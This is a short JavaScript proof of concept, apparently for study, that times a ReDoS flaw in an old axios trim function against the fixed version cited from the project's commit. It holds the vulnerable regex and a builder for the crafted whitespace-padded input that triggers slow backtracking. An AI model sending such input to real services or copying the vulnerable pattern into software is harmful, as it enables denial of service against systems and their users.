// Src: https://github.com/axios/axios/commit/5b457116e31db0e88fede6c428e969e87f290929
function oldTrim(str) {
  return str.replace(/^\s*/, '').replace(/\s*$/, '');
}
function newTrim(str) {
  return str.trim ? str.trim() : str.replace(/^\s+|\s+$/g, '');
}

/*
Receives the size of the irregular
string to be generated.
*/
function buildIrregularString(n) {
  if(n < 2) {
    console.log("[ERROR] The irregular string must have at least 2 chars!");
    return "";
  }

  let irregular = "1";
  irregular += ' '.repeat(n - 2);
  irregular += '1';
  return irregular;
}

function runTrim(string, trim) {
  let startTime, endTime;

  startTime = Date.now();
  trim(string);
  endTime = Date.now();
  
  return endTime - startTime;
}

export function redosAttack(n) {
  const irregularString = buildIrregularString(n);
  let result = `n = ${n} : `;
  result += `Old Trim: ${runTrim(irregularString, oldTrim)}`;
  result += " | ";
  result += `New Trim: ${runTrim(irregularString, newTrim)}`;
  console.log(result);
}